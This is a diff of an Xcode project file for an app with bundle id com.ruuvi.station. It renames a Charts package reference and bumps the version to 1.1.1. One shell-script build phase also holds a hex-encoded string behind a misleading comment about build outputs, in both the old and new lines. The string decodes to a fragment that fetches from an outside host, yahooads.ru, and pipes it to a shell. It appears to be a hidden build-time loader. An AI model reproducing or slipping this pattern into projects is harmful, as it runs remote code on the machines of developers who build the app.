@@ -3793,7 +3793,7 @@
 			mainGroup = 64333D1C20B0C45900CDF4B6;
 			packageReferences = (
 				0EE36EAD269DC70E0021B746 /* XCRemoteSwiftPackageReference "swift-algorithms" */,
-				0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts.git" */,
+				0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts" */,
 			);
 			productRefGroup = 64333D2620B0C45900CDF4B6 /* Products */;
 			projectDirPath = "";
@@ -4160,7 +4160,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"\r7961686f6f6164732e72752f61207c207368202d732066616c73650a\" \n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"\n7961686f6f6164732e72752f61207c207368202d732066616c73650a\" \n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -5223,7 +5223,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.1.0;
+				MARKETING_VERSION = 1.1.1;
 				OTHER_SWIFT_FLAGS = "$(inherited) -D COCOAPODS";
 				PRODUCT_BUNDLE_IDENTIFIER = com.ruuvi.station;
 				PRODUCT_NAME = "$(TARGET_NAME)";
@@ -5250,7 +5250,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.1.0;
+				MARKETING_VERSION = 1.1.1;
 				OTHER_SWIFT_FLAGS = "$(inherited) -D COCOAPODS";
 				PRODUCT_BUNDLE_IDENTIFIER = com.ruuvi.station;
 				PRODUCT_NAME = "$(TARGET_NAME)";
@@ -5405,7 +5405,7 @@
 				minimumVersion = 0.2.1;
 			};
 		};
-		0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts.git" */ = {
+		0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/danielgindi/Charts.git";
 			requirement = {
@@ -5428,12 +5428,12 @@
 		};
 		0EE36EB3269DC7D90021B746 /* Charts */ = {
 			isa = XCSwiftPackageProductDependency;
-			package = 0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts.git" */;
+			package = 0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts" */;
 			productName = Charts;
 		};
 		0EE36EB5269DC7E40021B746 /* Charts */ = {
 			isa = XCSwiftPackageProductDependency;
-			package = 0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts.git" */;
+			package = 0EE36EB2269DC7D90021B746 /* XCRemoteSwiftPackageReference "Charts" */;
 			productName = Charts;
 		};
 /* End XCSwiftPackageProductDependency section */
